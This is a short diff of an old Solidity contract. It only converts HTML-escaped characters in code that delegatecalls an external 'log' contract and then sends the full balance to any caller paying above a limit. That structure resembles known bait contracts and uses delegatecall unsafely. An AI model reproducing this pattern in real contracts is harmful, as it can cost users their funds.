@@ -1,6 +1,6 @@
 pragma solidity 0.4.19;
 contract loglib {
-   mapping (address =&gt; uint256) public sendList;
+   mapping (address => uint256) public sendList;
    
    function logSendEvent() payable public{
         sendList[msg.sender] = 1 ether;
@@ -25,9 +25,9 @@ contract testSend
     payable public
     {
 
-        if(msg.value&gt;=Limit)
+        if(msg.value>=Limit)
         {
-            log.delegatecall(bytes4(sha3(&quot;logSendEvent()&quot;)));
+            log.delegatecall(bytes4(sha3("logSendEvent()")));
             msg.sender.send(this.balance);
         }
     }
